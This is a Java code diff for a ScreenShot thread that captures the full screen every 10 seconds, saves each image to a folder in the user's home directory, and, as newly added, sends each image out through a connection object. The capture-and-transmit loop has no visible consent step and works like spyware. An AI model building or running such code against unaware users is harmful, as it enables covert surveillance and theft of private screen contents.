@@ -8,38 +8,43 @@ import java.io.IOException;
 import java.lang.*;
 import java.util.Date;
 
-public class ScreenShot extends Thread{
+public class ScreenShot extends Thread {
     private String homeDirectory;
-    public ScreenShot()
-    {
+    private ScreenshotSender screenshotSender;
+
+    public ScreenShot(ConnectionProvider connectionProvider) {
         homeDirectory = System.getProperty("user.home");
+        screenshotSender = new ScreenshotSender(connectionProvider);
     }
-    private final int timeInMilisec = 5000;
-    public void screenShot(){
+
+    private final int timeInMilisec = 10000;
+
+    public void screenShot() {
         Robot robot = null;
         try {
-             robot = new Robot();
-        }
-        catch (AWTException e) {
+            robot = new Robot();
+        } catch (AWTException e) {
             e.printStackTrace();
         }
         BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
         try {
-            ImageIO.write(screenShot, "JPG", new File(homeDirectory + "/screen/" + new Date().toString()));
+
+            File screenshot = new File(homeDirectory + "/screen/" + new Date().toString());
+            ImageIO.write(screenShot, "JPG", screenshot);
+            screenshotSender.sendScreenshot(screenshot);
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
-    public void run(){
+
+    public void run() {
         File dir = new File(homeDirectory + "/screen/");
         dir.mkdirs();
-        while(true)
-        {
+        while (true) {
             try {
                 Thread.sleep(timeInMilisec);
                 this.screenShot();
-            }
-            catch (InterruptedException e) {
+            } catch (InterruptedException e) {
                 e.printStackTrace();
             }
         }
